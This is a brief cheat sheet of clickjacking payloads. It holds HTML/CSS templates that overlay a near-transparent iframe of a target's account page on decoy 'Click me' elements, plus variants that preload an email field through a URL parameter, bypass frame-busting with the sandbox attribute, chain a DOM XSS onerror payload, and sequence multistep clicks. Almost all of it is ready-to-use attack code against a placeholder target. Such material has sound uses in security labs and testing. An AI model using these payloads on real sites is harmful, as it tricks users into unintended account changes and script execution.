# Clickjacking - CHEATSHEET 

## Cheat Sheet

```js
// BASIC TEMPLATE
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.1; // 0,000001;
       z-index: 2;
   }
   div {
       position:absolute;
       top:500px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="<IP>/my-account"></iframe>
// PRELOADED DATA BY URL PARAMETER
<iframe src="<IP>/my-account?email=foo@gmail.com"></iframe>
// ANTI FRAME BUSTER SCRIPT (DISABLE JAVASCRIPT)
<iframe sandbox="allow-forms" src="<IP>/my-account?email=foo@gmail.com"></iframe>
// CLICKJACKING + DOM XSS
<iframe src="<IP>/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>

```

MULTISTEP CLICKJACKING
```js
<style>
	iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.1; // 0,000001;
       z-index: 2;
   }
   .firstClick, .secondClick {
		position:absolute;
		top: 500px;
		left: 80px;
		z-index: 1;
	}
   .secondClick {
		top: 300px;
		left: 190px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="<IP>/my-account"></iframe>

```
